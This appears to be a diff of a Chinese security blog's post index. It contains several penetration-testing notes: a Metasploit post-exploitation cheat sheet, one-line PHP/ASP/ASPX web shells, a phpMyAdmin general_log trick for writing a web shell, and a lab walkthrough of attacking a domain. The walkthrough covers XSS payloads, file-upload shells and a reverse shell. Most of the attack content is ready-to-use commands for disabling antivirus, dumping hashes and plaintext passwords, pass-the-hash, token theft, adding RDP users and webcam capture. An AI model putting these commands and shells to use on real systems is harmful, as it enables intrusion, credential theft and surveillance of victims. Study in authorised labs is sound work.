+<p><img src="/2023/07/01/metasploit/image-20230701104859733.png" alt="image-20230701104859733"></p>
+<p>获取管理员权限，并进行编码防止乱码</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">退出shell：<span class="keyword">exit</span></span><br><span class="line">退出meterpreter：background</span><br><span class="line">查看meterpreter会话：sessions -l</span><br><span class="line">进入会话：session [id]</span><br></pre></td></tr></table></figure>
+<h3 id="脚本路径"><a href="#脚本路径" class="headerlink" title="脚本路径"></a>脚本路径</h3><p>/usr/share/metasploit-framework/modules/post/windows/gather<br>/usr/share/metasploit-framework/modules/post/linux/gather</p>
+<h3 id="查看主机信息"><a href="#查看主机信息" class="headerlink" title="查看主机信息"></a>查看主机信息</h3><p><img src="/2023/07/01/metasploit/image-20230701105209619.png" alt="image-20230701105209619"></p>
+<h3 id="查看是否允许在虚拟机上"><a href="#查看是否允许在虚拟机上" class="headerlink" title="查看是否允许在虚拟机上"></a>查看是否允许在虚拟机上</h3><p><img src="/2023/07/01/metasploit/image-20230701105307050.png" alt="image-20230701105307050"></p>
+<h3 id="开启远程登录"><a href="#开启远程登录" class="headerlink" title="开启远程登录"></a>开启远程登录</h3><p>​    run post/windows/manage/enable_rdp</p>
+<p><img src="/2023/07/01/metasploit/image-20230701105926735.png" alt="image-20230701105926735"></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">run post<span class="regexp">/windows/m</span>anage/migrate                			<span class="comment">#自动进程迁移</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/checkvm                			<span class="comment">#查看目标主机是否运行在虚拟机上</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_domain                      <span class="comment">#查找域控</span></span><br><span class="line">run post<span class="regexp">/windows/m</span>anage/killav                			<span class="comment">#关闭杀毒软件</span></span><br><span class="line">run post<span class="regexp">/windows/m</span>anage/enable_rdp            			<span class="comment">#开启远程桌面服务</span></span><br><span class="line">run post<span class="regexp">/windows/m</span>anage/autoroute              			<span class="comment">#查看路由信息</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_logged_on_users    		<span class="comment">#列举当前登录的用户</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_applications       		<span class="comment">#列举应用程序</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather<span class="regexp">/credentials/</span>windows_autologin 	<span class="comment">#抓取自动登录的用户名和密码</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/smart_hashdump               	<span class="comment">#dump出所有用户的hash</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_ie                         <span class="comment">#获取IE缓存</span></span><br><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_chrome                      <span class="comment">#获取Chrome缓存</span></span><br></pre></td></tr></table></figure>
+<h3 id="上传下载文件"><a href="#上传下载文件" class="headerlink" title="上传下载文件"></a>上传下载文件</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">download</span> file</span><br><span class="line"><span class="attribute">upload</span><span class="meta"> [攻击者文件位置]</span></span><br></pre></td></tr></table></figure>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p><img src="/2023/07/01/metasploit/image-20230701110023706.png" alt="image-20230701110023706"></p>
+<h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p><img src="/2023/07/01/metasploit/image-20230701110935673.png" alt="image-20230701110935673"></p>
+<p>导出hash密码</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">run hashdump</span><br><span class="line">用户hash数据输出格式：</span><br><span class="line">用户名<span class="symbol">:SID</span><span class="symbol">:LM</span>哈希<span class="symbol">:NTLM</span>哈希</span><br></pre></td></tr></table></figure>
+<p>然后去md5网站解密后两个数据即可</p>
+<p>导入域内所有用户hash：需要域管理员权限</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">run windows<span class="regexp">/gather/</span>smart_hashdump</span><br></pre></td></tr></table></figure>
+<h4 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h4><p>kiwi抓取密码，必须system权限</p>
+<p><img src="/2023/07/01/metasploit/image-20230701111459991.png" alt="image-20230701111459991"></p>
+<p>system权限，系统为64位，所以需要将meterpreter系统迁入x64位程序中，ps查看一下找一个就可以</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ps</span></span><br><span class="line"><span class="attribute">migrate</span><span class="meta"> [pid]</span></span><br></pre></td></tr></table></figure>
+<p>进入kiwi</p>
+<p><img src="/2023/07/01/metasploit/image-20230701112129815.png" alt="image-20230701112129815"></p>
+<p>明文密码：creds_all</p>
+<p><img src="/2023/07/01/metasploit/image-20230701112229483.png" alt="image-20230701112229483"></p>
+<p>kiwi_cmd模块<br>可以使用mimikatz的功能，kiwi_cmd [mimikatz.exe]</p>
+<h3 id="PSExec哈希传递"><a href="#PSExec哈希传递" class="headerlink" title="PSExec哈希传递"></a>PSExec哈希传递</h3><p>通过smart_hashdump等方式获取用户哈希后，可以利用psexec模块进行哈希传递攻击<br>前提条件：①开启445端口 smb服务；②开启admin$共享</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; <span class="built_in">set</span> RHOST 192.168.159.144</span><br><span class="line">msf &gt;<span class="built_in">set</span> SMBUser [username]</span><br><span class="line">msf &gt;<span class="built_in">set</span> SMBPass [hash password]</span><br><span class="line">msf &gt;<span class="built_in">set</span> SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure>
+<h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_applications</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701112836955.png" alt="image-20230701112836955"></p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">execute [参数] -f 指定的可执行文件</span><br><span class="line"></span><br><span class="line"><span class="deletion">-f：指定可执行文件</span></span><br><span class="line"><span class="deletion">-H：创建一个隐藏进程</span></span><br><span class="line"><span class="deletion">-a：传递给命令的参数</span></span><br><span class="line"><span class="deletion">-i：跟进程进行交互</span></span><br><span class="line"><span class="deletion">-m：从内存中执行</span></span><br><span class="line"><span class="deletion">-t：使用当前伪造的线程令牌运行进程</span></span><br><span class="line"><span class="deletion">-s：在给定会话中执行进程</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701113014126.png" alt="image-20230701113014126"></p>
+<h3 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h3><h4 id="incognito假冒令牌"><a href="#incognito假冒令牌" class="headerlink" title="incognito假冒令牌"></a>incognito假冒令牌</h4><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">load incognito     </span><br><span class="line">list_tokens -u    <span class="comment">#查看可用的token</span></span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  <span class="comment">#假冒SYSTEM token</span></span><br><span class="line">或</span><br><span class="line">impersonate_token NT\ AUTHORITY\\SYSTEM <span class="comment">#不加单引号 需使用\\</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">execute </span>-f cmd.exe -i –t    <span class="comment"># -t 使用假冒的token执行一个shell</span></span><br><span class="line">或</span><br><span class="line">shell</span><br><span class="line">rev2self   <span class="comment">#返回原始token</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701114716923.png" alt="image-20230701114716923"></p>
+<h4 id="steal-token窃取令牌"><a href="#steal-token窃取令牌" class="headerlink" title="steal_token窃取令牌"></a>steal_token窃取令牌</h4><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">steal_token <span class="variable">&lt;pid值&gt;</span>   <span class="comment">#从指定进程中窃取token   先ps</span></span><br><span class="line">drop_token  <span class="comment">#删除窃取的token</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701115235359.png" alt="image-20230701115235359"><br><img src="/2023/07/01/metasploit/image-20230701115249703.png" alt="image-20230701115249703"><br><img src="/2023/07/01/metasploit/image-20230701115306723.png" alt="image-20230701115306723"></p>
+<p>窃取令牌后，删除其他用户的token就会变成窃取的token</p>
+<h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><p><img src="/2023/07/01/metasploit/image-20230701113134291.png" alt="image-20230701113134291"></p>
+<p><img src="/2023/07/01/metasploit/image-20230701113324456.png" alt="image-20230701113324456"></p>
+<h3 id="创建新账户"><a href="#创建新账户" class="headerlink" title="创建新账户"></a>创建新账户</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">run post<span class="regexp">/windows/g</span>ather/enum_logged_on_users  <span class="comment">#查看目标主机有用户</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/01/metasploit/image-20230701113509518.png" alt="image-20230701113509518"></p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">run</span> getgui -u 用户 -p 密码</span><br><span class="line">或使用远程登录脚本</span><br><span class="line">enable_rdp脚本:</span><br><span class="line"><span class="built_in">run</span> post/windows/manage/enable_rdp <span class="attribute">USERNAME</span>=test2 <span class="attribute">PASSWORD</span>=Abc123456  #添加用户</span><br><span class="line"><span class="built_in">run</span> post/windows/manage/enable_rdp          #开启远程桌面</span><br><span class="line"><span class="built_in">run</span> post/windows/manage/enable_rdp <span class="attribute">FORWARD</span>=<span class="literal">true</span> <span class="attribute">LPORT</span>=6662   #将3389端口转发到6662</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="输入设备劫持"><a href="#输入设备劫持" class="headerlink" title="输入设备劫持"></a>输入设备劫持</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) keyboard  <span class="comment">#禁止(允许)目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) mouse     <span class="comment">#禁止(允许)目标使用鼠标</span></span><br></pre></td></tr></table></figure>
+<h3 id="拍照"><a href="#拍照" class="headerlink" title="拍照"></a>拍照</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">webcam_list</span>    <span class="comment">#获取目标系统的摄像头列表</span></span><br><span class="line">webcam_snap    <span class="comment">#从指定的摄像头，拍摄照片</span></span><br><span class="line">webcam_stream  <span class="comment">#从指定的摄像头，开启视频</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小马和大马</title>
+    <url>/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>一句话木马简称小马，可以获取到基本的getshell，大马通常在小马获取getshell后上传大马，获取到更多的高级权限操作。</p>
+<span id="more"></span>
+<h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">asp： &lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span> (“pass”)%&gt;</span><br><span class="line">aspx： &lt;%@ Page Language=“Jscript”%&gt; &lt;%<span class="keyword">eval</span>(Request.Item[“pass”],“unsafe”);%&gt;</span><br></pre></td></tr></table></figure>
+<p>注入条件</p>
+<ul>
+<li>知道网站绝对路径</li>
+<li>对数据库具有读写权</li>
+</ul>
+<p>然后使用getshell工具菜刀连接</p>
+<h2 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h2><p>首先获取大马文件，然后通过caidao上传至服务器</p>
+<p><img src="/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/image-20230630220808526.png" alt="image-20230630220808526"></p>
+<p>shell.php就是大马文件，有需要可以上传一个命令行，访问绝对路径就可以进入大马页面，密码打开大马脚本进行查看和更改</p>
+<p><img src="/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/image-20230630221345764.png" alt="image-20230630221345764"></p>
+<p>连接成功后可以获得比肩超级管理员的权限</p>
+<p>提权过程</p>
+<p>添加一个管理员组用户</p>
+<p><img src="/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/image-20230630222240295.png" alt="image-20230630222240295"></p>
+<p><img src="/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/image-20230630222302100.png" alt="image-20230630222302100"></p>
+<p><img src="/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/image-20230630225702473.png" alt="image-20230630225702473"></p>
+<p>远程连接：mstsc</p>
+<p><img src="/2023/06/30/%E5%B0%8F%E9%A9%AC%E5%92%8C%E5%A4%A7%E9%A9%AC/image-20230630225817610.png" alt="image-20230630225817610"></p>
+<p>获得对方主机管理员权限和操作系统控制，也可以选择建立监听反弹shell的方式获取控制权</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpmyadmin漏洞</title>
+    <url>/2023/06/30/phpmyadmin%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>利用全局日志上传shell</p>
+<span id="more"></span>
+<p>通过信息收集拿到网站绝对路径和phpmyadmin后可以利用into outfile写马拿到权限，但是新版本的mysql和一些系统设置问题，select into outfile和load data infile 命令需要secure_file_priv参数为null。函数写马示例如下</p>
+<p><img src="/2023/06/30/phpmyadmin%E6%BC%8F%E6%B4%9E/image-20230630211306716.png" alt="image-20230630211306716"></p>
+<p>使用命令show global variables like ‘%secure%’找到对应参数后如果set global secure_file_priv = 一个具体路径或这null，需要改成空，会发现提示体现权限不足不给写，完成这个改写操作需要linux的写权限。但是在渗透前期没有拿到权限的时候很难去修改。</p>
+<p>这个时候就可以利用全局日志的效果</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">show variables like &#x27;%general%&#x27;</span></span><br><span class="line"><span class="language-xml">set global general_log = on</span></span><br><span class="line"><span class="language-xml">set global general_log_file = &#x27;绝对路径&#x27;</span></span><br><span class="line"><span class="language-xml"># 查询一句话木马</span></span><br><span class="line"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[akali]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>之后再用antsword或caidao连接获取shell就可以了</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域环境的渗透</title>
+    <url>/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>记一次对域环境的渗透</p>
+<span id="more"></span>
+<p>环境配置</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230629093858835.png" alt="image-20230629093858835"></p>
+<p>server的作用是作为web服务器，有两块网卡，分别于kali攻击机(NAT)和内网两台主机(自定义网络)连通</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>主机名</th>
+<th>ip</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>kali</td>
+<td>192.168.153.137</td>
+</tr>
+<tr>
+<td>web server</td>
+<td>192.168.153.141<br>192.168.73.143</td>
+</tr>
+<tr>
+<td>domain</td>
+<td>192.168.73.138</td>
+</tr>
+<tr>
+<td>part</td>
+<td>192.168.73.150</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>ping测试<br>pingkali攻击机<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140629447.png" alt="image-20230630140629447"></p>
+<p>ping域用户<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230629094912234.png" alt="image-20230629094912234"></p>
+<p>ping域控<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132233547.png" alt="image-20230630132233547"></p>
+<p>kali攻击机pingweb服务器<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140654946.png" alt="image-20230630140654946"></p>
+<p>域控pingwebserver<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132326642.png" alt="image-20230630132326642"></p>
+<p>域控ping域用户<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630130352905.png" alt="image-20230630130352905"></p>
+<p>域用户ping域控<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132612724.png" alt="image-20230630132612724"></p>
+<p>域用户pingwebserver<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630132524457.png" alt="image-20230630132524457"></p>
+<p>可以发现webserver只允许自己ping别人，不允许别人ping自己，如果有管理员权限，win+r输入wf.msc启用imcp规则就可以。如果没有进行端口扫描时不可以用nmap中-sn功能</p>
+<p>域用户配置同网段下静态ip，静态dns设置为域控dns即可<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230629120535318.png" alt="image-20230629120535318"></p>
+<p>webserver开启phpstudy服务</p>
+<p>主机发现</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630140833874.png" alt="image-20230630140833874"></p>
+<p>找到webserver：192.168.153.128</p>
+<p>端口扫描</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630143825803.png" alt="image-20230630143825803"></p>
+<p>得到信息开启了80端口apache httpd服务，3306端口的mysql，以及操作系统是win server 2008等，访问http服务页面</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630144121058.png" alt="image-20230630144121058"></p>
+<p>得到管理员邮箱可以进行钓鱼，服务器版本信息可以用于查看是否存在nday漏洞，绝对路径用于sql注入获得shell</p>
+<p>漏洞扫描</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630144815870.png" alt="image-20230630144815870"></p>
+<p>主要给出了一些中间件或语言版本已经过时了</p>
+<p>爆破目录</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630145743448.png" alt="image-20230630145743448"><br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630145842255.png" alt="image-20230630145842255"><br>等共计找到70个页面<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630145957689.png" alt="image-20230630145957689"></p>
+<p>或者使用御剑只查看200的页面<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150122339.png" alt="image-20230630150122339"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150520576.png" alt="image-20230630150520576"></p>
+<p>敏感文件泄露</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150545390.png" alt="image-20230630150545390"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630150805895.png" alt="image-20230630150805895"></p>
+<p>像是一个网站，访问一下试试，可能会出现未指定数据库错误，只需要在url中指定数据库即可，查看robots.txt中给出的protect下存在配置文件，得到yxcms数据库为newsyxcms</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/yxcms/i</span>ndex.php?db=newsyxcms</span><br></pre></td></tr></table></figure>
+<p>漏洞利用</p>
+<p>yxcms信息泄露加弱口令</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630155331605.png" alt="image-20230630155331605"></p>
+<p>另外在尝试未知账户破解时发现，验证码是后端验证，所以在传递途中抓包并进行爆破不会触发服务器刷新验证码<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630160005909.png" alt="image-20230630160005909"></p>
+<p>验证码错误<img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630160032876.png" alt="image-20230630160032876"></p>
+<p>用户或密码错误<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630160134092.png" alt="image-20230630160134092"></p>
+<p>不输入账户或密码<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630160252237.png" alt="image-20230630160252237"></p>
+<p>均正确是页面被重定向<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630160542445.png" alt="image-20230630160542445"></p>
+<p>使用笛卡尔积方式可以进行爆破，不过不是很容易</p>
+<p>phpmyadmin也存在弱口令漏洞为root:root</p>
+<p>留言板存储型xss</p>
+<p>查看页面元素得到留言板输入框js代码<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630164910492.png" alt="image-20230630164910492"></p>
+<p>textarea语法规则如下<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630164955883.png" alt="image-20230630164955883"></p>
+<p>所以直接使用</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<script>alert(1)</script>
+
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630164753959.png" alt="image-20230630164753959"></p>
+<p>当该浏览审核通过后发现其他登录的用户进入留言本也会触发<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630165525192.png" alt="image-20230630165525192"></p>
+<p>证明存在存储型xss漏洞</p>
+<p>或使用onerror事件</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=x <span class="attribute">onerror</span>=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630183512490.png" alt="image-20230630183512490"></p>
+<p>同时审核通过后也可以在用户访问留言本时触发，也是存储型xss</p>
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630184026080.png" alt="image-20230630184026080"></p>
+<p>允许上传php文件，可以上传shell</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630184244426.png" alt="image-20230630184244426"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630184352381.png" alt="image-20230630184352381"></p>
+<p>成功上传，根据备份文件找到上传文件的绝对路径</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630185302884.png" alt="image-20230630185302884"></p>
+<p>caidao连接</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630190052705.png" alt="image-20230630190052705"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630190037343.png" alt="image-20230630190037343"></p>
+<p>开启全局日志getshell，请注意执行select into outfile和load data infile 命令需要设置secure_file_priv参数为null</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630195616747.png" alt="image-20230630195616747"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630195629947.png" alt="image-20230630195629947"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630201528495.png" alt="image-20230630201528495"></p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630201751205.png" alt="image-20230630201751205"></p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">&#x27;文件地址&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630204105809.png" alt="image-20230630204105809"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630204246580.png" alt="image-20230630204246580"></p>
+<p>已经写入日志文件中</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630204320600.png" alt="image-20230630204320600"></p>
+<p>菜刀连接</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230630210200119.png" alt="image-20230630210200119"></p>
+<p>反弹shell</p>
+<p>在kali攻击机中search windows找到reverse_tcp进行反向连接<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230701115944594.png" alt="image-20230701115944594"></p>
+<p>生成payload文件并上传至靶机中，比如前面通过文件上传shell使用caidao建立连接</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702001116236.png" alt="image-20230702001116236"></p>
+<p>然后开启http服务或其他方法如caidao上传至靶机，然后kali使用exploit/multi/handler监听模块。<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230701160028719-16881984289901.png" alt="image-20230701160028719"></p>
